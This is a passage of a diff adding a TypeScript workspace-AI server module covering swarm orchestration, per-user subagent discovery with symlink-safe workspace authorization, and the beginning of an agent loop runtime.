@@ -1,0 +1,5029 @@
+// © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
+// Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
+// [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
+
+/**
+ * Workspace AI 服务 — 重建旧架构 AI Workspace 的 15 个核心子模块。
+ *
+ * 迁移自 Python FastAPI (commit 3ee96cf0: server/app/api/v1/workspace/)。
+ * 所有模块采用内存存储 + 文件持久化（~/.ihui/ 风格），最小化外部依赖。
+ */
+
+import { exec, execFile } from 'node:child_process'
+import { createHash, randomUUID } from 'node:crypto'
+import { aiServiceSystemFetch } from '../utils/ai-service-fetch.js'
+import { judgeBoundedSystemJob, type BoundedJobVerdict } from '../utils/process-probe.js'
+import { resolveTruncation } from './agent-runtime/session-store.js'
+// 权限档唯一真源(G-161):本文件第 1574 行曾是第 7 套词表(4 档 camel,无 manual),
+// 且 check() 对 plan 是 fail-open —— 现类型与判定一起收口。值导入用于入参归一。
+import {
+  isReadonlyPermissionMode,
+  normalizePermissionMode,
+  permissionModeWire,
+} from '@ihui/types/permission-mode'
+import type { PermissionModeId } from '@ihui/types/permission-mode'
+import {
+  existsSync,
+  lstatSync,
+  mkdirSync,
+  readFileSync,
+  readdirSync,
+  realpathSync,
+  renameSync,
+  rmSync,
+  statSync,
+  writeFileSync,
+} from 'node:fs'
+import { logger } from '../utils/logger.js'
+import { decryptField, encryptField } from '../utils/crypto.js'
+import { getProcessRole } from '../utils/process-role.js'
+import { homedir, platform } from 'node:os'
+import {
+  basename,
+  delimiter,
+  dirname,
+  extname,
+  isAbsolute,
+  join,
+  relative,
+  resolve,
+  sep,
+} from 'node:path'
+// 工作区登记根判据(单源):文件桥的 workspacePath 与 browse 的 path 都问它,不再各处自量
+import {
+  assertWithinRegisteredRoots,
+  getRegisteredWorkspaceRoots,
+  isInsideRoot,
+  realpathOrResolve,
+} from '../utils/workspace-roots.js'
+// 远程沙箱后端(2026-11-20):显式 opt-in,缺配置即关(见模块头注)
+import { executeRemoteSandbox, resolveRemoteSandbox } from './remote-sandbox.js'
+import { truncateBothEnds } from './output-budget.js'
+import { promisify } from 'node:util'
+import { hasNestedQuantifier } from './rules-service.js'
+// 规则级审批引擎(纯函数)+ 授权/历史记忆:静态导入,避免在 FS Bridge 热路径上
+// 每次判定都多一次动态 import 的模块加载延迟(既有用例按"一个 tick"断言 pending)。
+import { computeFacts, decideApproval } from '@ihui/shared/permission'
+import { listApprovalHistory, recordApprovalHistory } from './permission-grants.js'
+// 读前写保护(工具层护栏):观察态只在内存,不跨会话持久(§0.12 复现 dsh fs-observation-policy)
+import { FsObservationStore, isFsObservationEnforced } from './fs-observation-policy.js'
+
+const execAsync = promisify(exec)
+
+// =============================================================================
+// 公共存储根目录 (~/.ihui/)
+// =============================================================================
+
+const STORE_ROOT = join(homedir(), '.ihui')
+const SWARMS_DIR = join(STORE_ROOT, 'swarms')
+const BG_AGENTS_DIR = join(STORE_ROOT, 'background-agents')
+const PERSONAS_FILE = join(STORE_ROOT, 'personas.json')
+
+/**
+ * 例行程序存储文件(F-301)。IHUI_STORE_ROOT 仅用于测试注入临时存储根,生产默认 ~/.ihui。
+ * 路径延迟求值:测试在模块导入后才设置环境变量,不能在模块顶层把路径钉死。
+ */
+function routinesFile(): string {
+  return join(process.env.IHUI_STORE_ROOT?.trim() || STORE_ROOT, 'routines.json')
+}
+
+/**
+ * 最近工作区按 userId 分文件(F-278):此前是全局共享的 recent-workspaces.json,
+ * 任何登录用户 GET /fs/recent 都能读到别人最近打开的绝对路径。
+ * 文件名用 userId 的 SHA-256 前缀,避免把任意 userId 直接拼进路径(目录穿越/非法字符)。
+ * IHUI_STORE_ROOT 仅用于测试注入临时存储根,生产默认仍是 ~/.ihui。
+ */
+function recentWorkspacesFile(userId: string): string {
+  const root = process.env.IHUI_STORE_ROOT?.trim() || STORE_ROOT
+  const key = createHash('sha256').update(userId).digest('hex').slice(0, 32)
+  return join(root, 'recent-workspaces', `${key}.json`)
+}
+
+function ensureDir(dir: string): void {
+  if (!existsSync(dir)) mkdirSync(dir, { recursive: true })
+}
+
+function nowIso(): string {
+  return new Date().toISOString()
+}
+
+function nowSec(): number {
+  return Date.now() / 1000
+}
+
+function readJson<T>(file: string, fallback: T): T {
+  if (!existsSync(file)) return fallback
+  try {
+    return JSON.parse(readFileSync(file, 'utf-8')) as T
+  } catch {
+    return fallback
+  }
+}
+
+function nodeErrorCode(error: unknown): string | undefined {
+  if (error !== null && typeof error === 'object' && 'code' in error) {
+    const code = (error as { code?: unknown }).code
+    if (typeof code === 'string') return code
+  }
+  return undefined
+}
+
+/** 确实没有才用 fallback。读不到或内容损坏必须抛,调用方不得把 fallback 写回去。 */
+function readJsonForUpdate<T>(file: string, fallback: T, unread: string): T {
+  let text: string
+  try {
+    text = readFileSync(file, 'utf-8')
+  } catch (error) {
+    const code = nodeErrorCode(error)
+    if (code === 'ENOENT' || code === 'ENOTDIR') return fallback
+    throw new Error(`${unread} (${code ?? 'unknown'})`)
+  }
+  let parsed: unknown
+  try {
+    parsed = JSON.parse(text)
+  } catch {
+    throw new Error(`${unread} (parse)`)
+  }
+  if (parsed === null) throw new Error(`${unread} (parse)`)
+  return parsed as T
+}
+
+let writeJsonSeq = 0
+
+/**
+ * F-303:落盘改「临时文件 + rename」原子写 —— 直接 writeFileSync 目标文件时,
+ * 磁盘满 / Windows EBUSY / 只读挂载会在写了一半时抛错,留下半截 JSON(下次读出必崩)。
+ * 临时文件与目标同目录(同一分区),失败时尽力清理临时文件但保留原始错误。
+ */
+function writeJson(file: string, data: unknown): void {
+  ensureDir(dirname(file))
+  const tmp = `${file}.${process.pid}.${++writeJsonSeq}.tmp`
+  try {
+    writeFileSync(tmp, JSON.stringify(data, null, 2), 'utf-8')
+    renameSync(tmp, file)
+  } catch (error) {
+    try {
+      rmSync(tmp, { force: true })
+    } catch {
+      // 清理失败不得掩盖原始写入错误
+    }
+    throw error
+  }
+}
+
+// =============================================================================
+// 1. Swarm — 群体智能多 Agent 编排
+// =============================================================================
+
+export type SwarmAgentRole = 'coordinator' | 'worker' | 'reviewer'
+export type SwarmStatus = 'planning' | 'executing' | 'completed' | 'failed'
+
+export interface SwarmAgent {
+  agentId: string
+  role: SwarmAgentRole
+  name: string
+  description: string
+  systemPrompt: string
+  tools: string[]
+  model: string
+  status: 'idle' | 'running' | 'completed' | 'failed'
+  result: string | null
+  dependencies: string[]
+}
+
+export interface SwarmPlan {
+  swarmId: string
+  /** F-402:属主用户 —— 所有读取/推进/终止入口都按 (swarmId, ownerId) 定位,防跨用户劫持。 */
+  ownerId: string
+  task: string
+  agents: SwarmAgent[]
+  workspacePath: string
+  modelId: string
+  createdAt: number
+  status: SwarmStatus
+  results: Record<string, string>
+}
+
+class SwarmManager {
+  private plans = new Map<string, SwarmPlan>()
+
+  create(params: {
+    ownerId: string
+    task: string
+    workspacePath: string
+    modelId?: string
+    agents: Array<{
+      role: SwarmAgentRole
+      name: string
+      description?: string
+      systemPrompt?: string
+      tools?: string[]
+      model?: string
+      dependencies?: string[]
+    }>
+  }): SwarmPlan {
+    const swarmId = randomUUID().slice(0, 12)
+    const agents: SwarmAgent[] = params.agents.map((a) => ({
+      agentId: randomUUID().slice(0, 8),
+      role: a.role,
+      name: a.name,
+      description: a.description ?? '',
+      systemPrompt: a.systemPrompt ?? '',
+      tools: a.tools ?? [],
+      model: a.model ?? 'inherit',
+      status: 'idle',
+      result: null,
+      dependencies: a.dependencies ?? [],
+    }))
+    const plan: SwarmPlan = {
+      swarmId,
+      ownerId: params.ownerId,
+      task: params.task,
+      agents,
+      workspacePath: params.workspacePath,
+      modelId: params.modelId ?? 'default',
+      createdAt: nowSec(),
+      status: 'planning',
+      results: {},
+    }
+    this.plans.set(swarmId, plan)
+    this.persist(plan)
+    return plan
+  }
+
+  /** F-402:列表只返回该属主的 swarm。 */
+  list(ownerId: string): SwarmPlan[] {
+    return Array.from(this.plans.values()).filter((p) => p.ownerId === ownerId)
+  }
+
+  /** F-402:按 (swarmId, ownerId) 定位;非属主视为不存在(null),由路由转 404 防枚举。 */
+  get(swarmId: string, ownerId: string): SwarmPlan | null {
+    const plan = this.plans.get(swarmId)
+    if (!plan || plan.ownerId !== ownerId) return null
+    return plan
+  }
+
+  /**
+   * 执行 swarm：无依赖 agent 并行，有依赖 agent 等待依赖完成后启动。
+   */
+  async execute(swarmId: string, ownerId: string): Promise<SwarmPlan> {
+    const plan = this.get(swarmId, ownerId)
+    if (!plan) throw new Error(`Swarm 不存在: ${swarmId}`)
+    plan.status = 'executing'
+    this.persist(plan)
+
+    const completed = new Set<string>()
+    const runAgent = async (agent: SwarmAgent): Promise<void> => {
+      // 等待依赖完成
+      if (agent.dependencies.length > 0) {
+        await Promise.all(
+          agent.dependencies.map((depId) => this.waitForDependency(depId, completed)),
+        )
+      }
+      agent.status = 'running'
+      this.persist(plan)
+
+      try {
+        // 模拟 agent 执行（实际应调用 AgentLoopRuntime）
+        const result = `[${agent.role}] ${agent.name} 完成任务: ${plan.task}`
+        agent.result = result
+        agent.status = 'completed'
+        plan.results[agent.agentId] = result
+        completed.add(agent.agentId)
+      } catch (e) {
+        agent.status = 'failed'
+        agent.result = (e as Error).message
+        completed.add(agent.agentId)
+      }
+      this.persist(plan)
+    }
+
+    // 并行执行所有 agent（依赖在 runAgent 内部协调）
+    await Promise.all(plan.agents.map(runAgent))
+
+    plan.status = plan.agents.every((a) => a.status === 'completed') ? 'completed' : 'failed'
+    this.persist(plan)
+    return plan
+  }
+
+  cancel(swarmId: string, ownerId: string): boolean {
+    const plan = this.get(swarmId, ownerId)
+    if (!plan) return false
+    plan.status = 'failed'
+    this.persist(plan)
+    return true
+  }
+
+  private waitForDependency(depId: string, completed: Set<string>): Promise<void> {
+    if (completed.has(depId)) return Promise.resolve()
+    return new Promise((resolveWait) => {
+      // P0 修复:5 分钟超时兜底,防止依赖永远不完成导致定时器泄漏
+      const TIMEOUT_MS = 5 * 60 * 1000
+      const timer = setInterval(() => {
+        if (completed.has(depId)) {
+          clearInterval(timer)
+          clearTimeout(timeoutGuard)
+          resolveWait()
+        }
+      }, 100)
+      timer.unref() // 不阻止进程退出
+
+      const timeoutGuard = setTimeout(() => {
+        clearInterval(timer)
+        resolveWait() // 超时也 resolve,不阻塞流程
+      }, TIMEOUT_MS)
+      timeoutGuard.unref()
+    })
+  }
+
+  private persist(plan: SwarmPlan): void {
+    ensureDir(SWARMS_DIR)
+    writeFileSync(join(SWARMS_DIR, `${plan.swarmId}.json`), JSON.stringify(plan, null, 2), 'utf-8')
+  }
+}
+
+export const swarmManager = new SwarmManager()
+
+// =============================================================================
+// 2. Subagents — 子代理委派
+// =============================================================================
+
+export interface SubagentConfig {
+  name: string
+  description: string
+  systemPrompt: string
+  tools: string[]
+  model: string
+  filePath: string
+}
+
+/**
+ * 子代理工作区授权失败(未配置权限 / 跨用户越权 / 登记根外)。
+ *
+ * 路由层统一映射 404:沿用本仓「未授权与不存在同形」的防枚举约定,不引 403 ——
+ * 否则 403/404 的差异本身就是一枚存在性探针,攻击者可据此枚举服务器上哪些路径
+ * 已被他人登记为工作区。message 刻意不含任何服务器路径。
+ */
+export class SubagentWorkspaceAccessError extends Error {
+  readonly statusCode = 404
+  constructor(message = '工作区不存在或无权访问') {
+    super(message)
+    this.name = 'SubagentWorkspaceAccessError'
+  }
+}
+
+/**
+ * 子代理脚手架符号链接失效(悬空 / 越界 / 不可解析)。
+ *
+ * 为什么单独一类:Windows 端创建 symlink/junction 后,`readFileSync` 对悬空链接会抛
+ * 裸 ENOENT、对目录链接抛 EISDIR —— 那是「崩溃」不是「拒绝」。这里把两类都收成
+ * 明确的中文错误,路由层映射 400;越界链接则按「拒绝」处理,绝不跟随到工作区外。
+ */
+export class SubagentLinkError extends Error {
+  readonly statusCode = 400
+  constructor(message: string) {
+    super(message)
+    this.name = 'SubagentLinkError'
+  }
+}
+
+/**
+ * 一条 `workspace_permissions` 行归一后代表的可访问范围。
+ *
+ * 口径一(2026-11-02 拍板,勿再翻案):permission 行的 `workspacePath` 是**根**,
+ * 授权范围 = **该根及其子树**。判定必须先把两侧都 realpath 归一,再用
+ * `isInsideRoot`(内部走 `path.relative` + 段比较),**不得**退化成字符串前缀 ——
+ * 前缀会把 `ws-a-other` 误认成 `ws-a` 的子目录,也会把符号链接指到的外部路径
+ * 当成根内路径。根自身与任意层子目录放行;看似子目录、实为别处(`..` 回跳、
+ * 邻名前缀、链接外指)一律拒绝。
+ */
+interface AuthorizedWorkspaceRoot {
+  /** realpath 归一后的授权根(permission 行路径) */
+  root: string
+  /**
+   * 该根是否只能读。
+   *
+   * 口径二(2026-11-02 拍板):`mode` **只管写面**。`plan` 是唯一只读档
+   * (`isReadonlyPermissionMode`);只读档对 `discover`/`list` 不设限(看自己的
+   * 定义是合理的),只对 `delegate`(会触发实际执行)设限。认不出的库值按只读
+   * 处理(fail-closed):不把"没人认识"读成"可写"。
+   */
+  readonly: boolean
+}
+
+/**
+ * 调用者在该用户级 `workspace_permissions` 表里真正有权的工作区根。
+ *
+ * 单一判据来源是 `listPermissionsByUser`(SQL 自带 userId 谓词,不会读到别人的行),
+ * 这里只做两道收窄:
+ *   ① 行里的 workspacePath 必须仍在服务端 `IHUI_WORKSPACE_ROOTS` 登记根内 ——
+ *      白名单启用(2026-10-27)之前落库的历史行不能成为绕过口;
+ *   ② 统一 realpath 归一,消解客户端字符串里的符号链接/相对形态。
+ * 这与「无归属的登记根」相反:登记根只有在**有归属行**时才可能被使用。
+ */
+async function listAuthorizedWorkspaceRoots(userId: string): Promise<AuthorizedWorkspaceRoot[]> {
+  const { listPermissionsByUser } = await import('../db/workspace-permission-queries.js')
+  const rows = await listPermissionsByUser(userId)
+  const registered = getRegisteredWorkspaceRoots()
+  const out: AuthorizedWorkspaceRoot[] = []
+  for (const row of rows) {
+    const real = realpathOrResolve(row.workspacePath)
+    if (!registered.some((r) => isInsideRoot(real, r))) continue
+    const mode = normalizePermissionMode(row.mode)
+    const readonly = mode === null || isReadonlyPermissionMode(mode)
+    const existing = out.find((x) => x.root === real)
+    // 同一 realpath 可能对应多行(历史别名/symlink 落库):取更严的那档
+    if (existing) existing.readonly = existing.readonly || readonly
+    else out.push({ root: real, readonly })
+  }
+  return out
+}
+
+/**
+ * 授权闸的唯一实现:登记根闸 + 用户级 permission 子树闸,两关缺一不可。
+ *
+ * 口径一在这里落地:命中的是 permission 行的根,**范围含该根及其子树**;
+ * 判定是 `isInsideRoot(root, authorizedRoot)`(realpath 之后的段比较),
+ * 不是 `root.startsWith(authorizedRoot)`。前者对 `..` 回跳、邻名前缀
+ * (`ws-a-other` vs `ws-a`)、symlink 外指都返回 false;后者会全部误放行。
+ *
+ * 返回命中的授权根与其读写档,供 `delegate` 做写面闸。
+ * 任一级失败都抛 404 语义错误,不区分「未登记」「不是你的」两种原因(防枚举)。
+ */
+async function resolveSubagentWorkspace(
+  userId: string,
+  workspacePath: string,
+): Promise<AuthorizedWorkspaceRoot & { requestedRoot: string }> {
+  let requestedRoot: string
+  try {
+    requestedRoot = assertWithinRegisteredRoots(workspacePath, '工作区')
+  } catch {
+    throw new SubagentWorkspaceAccessError()
+  }
+  const allowed = await listAuthorizedWorkspaceRoots(userId)
+  const hit = allowed.find((a) => isInsideRoot(requestedRoot, a.root))
+  if (!hit) throw new SubagentWorkspaceAccessError()
+  return { ...hit, requestedRoot }
+}
+
+/** 读面闸(`discover`/`list`):只看「这个请求路径是否在本人授权根的子树内」 */
+async function assertSubagentWorkspaceAccess(
+  userId: string,
+  workspacePath: string,
+): Promise<string> {
+  return (await resolveSubagentWorkspace(userId, workspacePath)).requestedRoot
+}
+
+/**
+ * 写面闸(`delegate`):在读面闸之上叠加 `mode`。
+ *
+ * 口径二:只读档(`plan`)必须拒绝,回 404 而不是 403 —— 与未授权同形,
+ * 不给"这个工作区存在、只是你只读"提供存在性探针。可写档(default /
+ * acceptEdits / bypassPermissions / manual)放行。
+ */
+async function assertSubagentWorkspaceWritable(
+  userId: string,
+  workspacePath: string,
+): Promise<string> {
+  const hit = await resolveSubagentWorkspace(userId, workspacePath)
+  if (hit.readonly) throw new SubagentWorkspaceAccessError()
+  return hit.requestedRoot
+}
+
+class SubagentManager {
+  /**
+   * 按**归一后的工作区根**分桶,而不是全服一个 name→config 映射。
+   *
+   * 旧实现把每次 discover 的结果塞进同一个 Map,`list()` 返回的是全局并集:
+   * 用户 A 在 A 工作区发现的子代理,用户 B 调 `/subagents`(不带 workspacePath)
+   * 就能读到;delegate 也只按 name 取,传任意 workspacePath 都能用别人的配置。
+   * 分桶后,读取面必须同时命中「调用者有权」与「该根自己的桶」两个条件。
+   */
+  private buckets = new Map<string, Map<string, SubagentConfig>>()
+
+  /** 发现并登记某个工作区(**先授权,后落盘扫描**),返回该桶的配置 */
+  async discover(workspacePath: string, userId: string): Promise<SubagentConfig[]> {
+    const root = await assertSubagentWorkspaceAccess(userId, workspacePath)
+    const found = this.scanWorkspace(root)
+    const bucket = new Map<string, SubagentConfig>()
+    for (const cfg of found) {
+      if (!bucket.has(cfg.name)) bucket.set(cfg.name, cfg)
+    }
+    // 整桶替换而非合并:删除掉的 .md 不能在下一次 discover 后继续被 delegate 命中
+    this.buckets.set(root, bucket)
+    return Array.from(bucket.values())
+  }
+
+  /**
+   * 列出调用者有权的工作区里已发现过的子代理。
+   * 显式给 workspacePath 时等价于一次 discover;未给时只并集**本人有权根**的桶,
+   * 不再回退到「全局已发现」(那正是跨用户泄漏面)。
+   */
+  async list(workspacePath: string | undefined, userId: string): Promise<SubagentConfig[]> {
+    if (workspacePath) return this.discover(workspacePath, userId)
+    // 读面不看 mode:只读档用户也应能看到自己有权根里已发现的配置
+    const roots = await listAuthorizedWorkspaceRoots(userId)
+    const out: SubagentConfig[] = []
+    for (const { root } of roots) {
+      const bucket = this.buckets.get(root)
+      if (bucket) out.push(...bucket.values())
+    }
+    return out
+  }
+
+  /**
+   * 委派任务给子代理(独立上下文)。
+   * 写面闸:先过用户级授权与子树判定,再按 `mode` 拒绝只读档(404,防枚举)。
+   * 只查**本次 workspacePath 对应桶**,不跨桶兜底 —— 否则「有权进入 B 工作区」
+   * 就能调用只存在于 A 工作区(他人)的子代理配置。
+   */
+  async delegate(params: {
+    name: string
+    prompt: string
+    workspacePath: string
+    model?: string
+    userId: string
+  }): Promise<{ agentName: string; result: string }> {
+    const root = await assertSubagentWorkspaceWritable(params.userId, params.workspacePath)
+    const cfg = this.buckets.get(root)?.get(params.name)
+    if (!cfg) throw new SubagentWorkspaceAccessError('子代理不存在或无权访问')
+    // 简化：返回子代理执行结果（实际应调用 AgentLoopRuntime）
+    return {
+      agentName: cfg.name,
+      result: `[子代理 ${cfg.name}] 已处理: ${params.prompt.slice(0, 100)}`,
+    }
+  }
+
+  /**
+   * 扫描 `<root>/.claude/agents`。
+   *
+   * 与旧实现的差别:
+   *   ① 只扫工作区内的这一处;`~/.ihui/agents` 是**服务器主目录**下的全局目录,
+   *      不归任何用户所有,按「configs 分桶必须落在调用者有权根内」的口径不再暴露
+   *      (需要全局内置代理时应落到某个用户已登记的根里)。
+   *   ② 每一级(目录自身 / 每个 .md)都先 realpath 消解再判 isInsideRoot:
+   *      目录级 junction 指向根外 → 拒绝;文件级 symlink 指向根外 → 拒绝;
+   *      链接目标不存在 → SubagentLinkError(明确错误),而不是 readFileSync 的裸 ENOENT。
+   *   ③ 同一目录里同名配置按先到先得去重(与旧实现 seen 集合同语义)。
+   */
+  private scanWorkspace(root: string): SubagentConfig[] {
+    const agentsDir = join(root, '.claude', 'agents')
+    // lstat 而不是 existsSync:悬空链接在 existsSync 下会被当成「不存在」而静默跳过,
+    // 那样「目标不存在」就永远走不到明确报错分支。
+    try {
+      lstatSync(agentsDir)
+    } catch (e) {
+      const code = (e as NodeJS.ErrnoException).code
+      if (code === 'ENOENT') return []
+      throw new SubagentLinkError(`子代理目录 .claude/agents 无法读取(${code ?? '未知错误'})`)
+    }
+    const realDir = this.resolveInsideRoot(root, agentsDir, '子代理目录 .claude/agents')
+    let dirStat
+    try {
+      dirStat = statSync(realDir)
+    } catch (e) {
+      throw new SubagentLinkError(
+        `子代理目录 .claude/agents 无法读取(${(e as NodeJS.ErrnoException).code ?? '未知错误'})`,
+      )
+    }
+    if (!dirStat.isDirectory()) return []
+
+    let names: string[]
+    try {
+      names = readdirSync(realDir)
+    } catch (e) {
+      throw new SubagentLinkError(
+        `子代理目录 .claude/agents 无法读取(${(e as NodeJS.ErrnoException).code ?? '未知错误'})`,
+      )
+    }
+
+    const found: SubagentConfig[] = []
+    for (const name of names) {
+      if (!name.endsWith('.md')) continue
+      // 目录项可能是 symlink:realpath 消解后仍须在工作区内,否则拒绝该文件
+      const realFile = this.resolveInsideRoot(root, join(realDir, name), `子代理文件 ${name}`)
+      let fileStat
+      try {
+        fileStat = statSync(realFile)
+      } catch {
+        throw new SubagentLinkError(`子代理文件 ${name} 的符号链接目标不存在`)
+      }
+      if (!fileStat.isFile()) continue
+      const cfg = this.parseFile(realFile, basename(name, '.md'))
+      if (cfg) found.push(cfg)
+    }
+    return found
+  }
+
+  /** realpath 消解 → 必须仍在工作区根内;悬空/不可解析统一抛明确错误 */
+  private resolveInsideRoot(root: string, p: string, label: string): string {
+    let real: string
+    try {
+      real = realpathSync(p)
+    } catch (e) {
+      const code = (e as NodeJS.ErrnoException).code
+      if (code === 'ENOENT' || code === 'ENOTDIR') {
+        throw new SubagentLinkError(`${label} 的符号链接目标不存在`)
+      }
+      throw new SubagentLinkError(`${label} 无法解析(${code ?? '未知错误'})`)
+    }
+    if (!isInsideRoot(real, root)) {
+      throw new SubagentLinkError(`${label} 指向工作区外的路径`)
+    }
+    return real
+  }
+
+  private parseFile(filePath: string, fallbackName: string): SubagentConfig | null {
+    let content: string
+    try {
+      content = readFileSync(filePath, 'utf-8')
+    } catch (e) {
+      throw new SubagentLinkError(
+        `子代理文件 ${fallbackName} 无法读取(${(e as NodeJS.ErrnoException).code ?? '未知错误'})`,
+      )
+    }
+    if (!content.startsWith('---')) {
+      return {
+        name: fallbackName,
+        description: '',
+        systemPrompt: content.trim(),
+        tools: [],
+        model: 'inherit',
+        filePath,
+      }
+    }
+    const endIdx = content.indexOf('---', 3)
+    if (endIdx === -1) return null
+    const frontmatter = content.slice(3, endIdx).trim()
+    const body = content.slice(endIdx + 3).trim()
+    const meta: Record<string, string | string[]> = {}
+    for (const line of frontmatter.split('\n')) {
+      const idx = line.indexOf(':')
+      if (idx === -1) continue
+      const key = line.slice(0, idx).trim()
+      const val = line.slice(idx + 1).trim()
+      meta[key] = key === 'tools' && val ? val.split(',').map((t) => t.trim()) : val
+    }
+    return {
+      name: (meta['name'] as string) ?? fallbackName,
+      description: (meta['description'] as string) ?? '',
+      systemPrompt: body,
+      tools: (meta['tools'] as string[]) ?? [],
+      model: (meta['model'] as string) ?? 'inherit',
+      filePath,
+    }
+  }
+}
+
+export const subagentManager = new SubagentManager()
+
+// =============================================================================
+// 3. AgentLoop — 完整 Agent Runtime（工具调用循环 + 状态管理）
+// =============================================================================
+
+export type AgentTaskStatus = 'running' | 'completed' | 'failed' | 'canceled'
+
+export interface AgentStep {
+  iteration: number
+  type: 'llm' | 'tool_call' | 'tool_result'
+  content: string
+  tool?: string
+  args?: unknown
+}
+
+export interface AgentTask {
+  taskId: string
+  /** 任务发起人;list/status/cancel/inject 一律按此归属过滤(F-39) */
+  userId: string
+  sessionId: string
+  goal: string
+  status: AgentTaskStatus
+  /** P3 #44 阶段1:running 起始时间(瓶颈高亮数据源);终态任务保留原值 */
+  startedAt: string
+  /** P3 #44 阶段3:中途插话队列(run 循环每轮开头消费) */
+  injections: string[]
+  iterations: number
+  steps: AgentStep[]
+  result: string
+  error: string | null
+  createdAt: string
+  updatedAt: string
+}
+
+interface ToolHandler {
+  name: string
+  description: string
+  execute: (args: Record<string, unknown>) => Promise<string>
+}
+
+class AgentLoopRuntime {
+  private tasks = new Map<string, AgentTask>()
+  private tools = new Map<string, ToolHandler>()
+  private injections = new Map<string, string[]>()
+
+  private static readonly TERMINAL_TTL_MS = 60 * 60 * 1000
+
+  /**
+   * 终态任务保留 1 小时后回收,连带清插话队列(F-39)。
+   * 原先 tasks/injections 只增不删,running 之外的任务永久占用内存。
+   */
+  private pruneTerminalTasks(now = Date.now()): void {
+    for (const [taskId, task] of this.tasks) {
+      if (task.status === 'running') continue
+      if (now - Date.parse(task.updatedAt) > AgentLoopRuntime.TERMINAL_TTL_MS) {
+        this.tasks.delete(taskId)
+        this.injections.delete(taskId)
+      }
+    }
+  }
+
+  /**
+   * P3 #44 阶段3 中途插话:向运行中的 task 注入用户消息,下一轮迭代
+   * 由 run 循环消费拼进 prompt(内存队列,终态任务拒绝)。
+   * F-39:插话属于写操作,必须同时校验任务归属,禁止跨用户篡改他人队列。
+   */
+  injectMessage(taskId: string, userId: string, content: string): boolean {
+    this.pruneTerminalTasks()
+    const task = this.tasks.get(taskId)
+    if (!task || task.userId !== userId || task.status !== 'running') return false
+    const trimmed = content.trim()
+    if (!trimmed) return false
+    const queue = this.injections.get(taskId) ?? []
+    queue.push(trimmed.slice(0, 2000))
+    this.injections.set(taskId, queue)
+    return true
+  }
+
+  private drainInjections(taskId: string): string[] {
+    const queue = this.injections.get(taskId)
+    if (!queue || queue.length === 0) return []
+    this.injections.set(taskId, [])
+    return queue
+  }
+
+  registerTool(tool: ToolHandler): void {
+    this.tools.set(tool.name, tool)
+  }
+
+  listTools(): ToolHandler[] {
+    return Array.from(this.tools.values())
+  }
+
+  /** F-39:只返回调用者自己的任务,防止跨用户读全表 */
+  listRunning(userId: string): Record<string, AgentTask> {
+    this.pruneTerminalTasks()
+    return Object.fromEntries(Array.from(this.tasks).filter(([, task]) => task.userId === userId))
+  }
+
+  /** F-39:非本人任务一律按不存在处理,调用方回 404 */
+  status(taskId: string, userId: string): AgentTask | null {
+    this.pruneTerminalTasks()
+    const task = this.tasks.get(taskId)
+    return task && task.userId === userId ? task : null
+  }
+
+  /** F-39:非本人任务不可取消 */
+  cancel(taskId: string, userId: string): boolean {
+    this.pruneTerminalTasks()
+    const task = this.tasks.get(taskId)
+    if (!task || task.userId !== userId || task.status !== 'running') return false
+    task.status = 'canceled'
+    task.updatedAt = nowIso()
+    return true
+  }
+
+  async run(params: {
+    goal: string
+    /** 任务发起人(F-39):写入任务并作为后续 list/status/cancel/inject 的归属键 */
+    userId: string
+    sessionId?: string
+    model?: string
+    maxIterations?: number
+    tools?: string[]
+    workspacePath?: string
+  }): Promise<AgentTask> {
+    const taskId = randomUUID().replace(/-/g, '').slice(0, 12)
+    const sessionId = params.sessionId ?? randomUUID().replace(/-/g, '').slice(0, 12)
+    const maxIter = params.maxIterations ?? 10
+    const task: AgentTask = {
+      taskId,
+      userId: params.userId,
+      sessionId,
+      goal: params.goal,
+      status: 'running',
+      startedAt: nowIso(),
+      injections: [],
+      iterations: 0,
+      steps: [],
+      result: '',
+      error: null,
+      createdAt: nowIso(),
+      updatedAt: nowIso(),
+    }
+    this.pruneTerminalTasks()
+    this.tasks.set(taskId, task)
+
+    try {
+      // F-306:LLM 真实失败时禁止落伪成功分支(completed + 伪造「第 N 轮思考」)。
+      let llmError: string | null = null
+      for (let i = 0; i < maxIter; i++) {
+        if (task.status === 'canceled') break
+        task.iterations = i + 1
+        // P3 #44 阶段3:消费中途插话,拼进本轮思考 prompt
+        const injected = this.drainInjections(taskId)
+        if (injected.length > 0) {
+          for (const msg of injected) {
+            task.steps.push({ iteration: i + 1, type: 'llm', content: `[用户中途插话] ${msg}` })
+          }
+        }
+        const injectionBlock =
+          injected.length > 0
+            ? `\n用户中途插话(请优先响应):\n${injected.map((m) => `- ${m}`).join('\n')}`
+            : ''
+        // LLM 思考步骤 — F-306:ai-service 的 llm 路由只挂在 `/api` 前缀下
+        // (apps/ai-service/app/main.py include_router(llm.router, prefix="/api")),
+        // 旧写法 `/llm/chat` 恒 404;404 又落伪成功分支,任务被置 completed。
+        let llmContent: string
+        try {
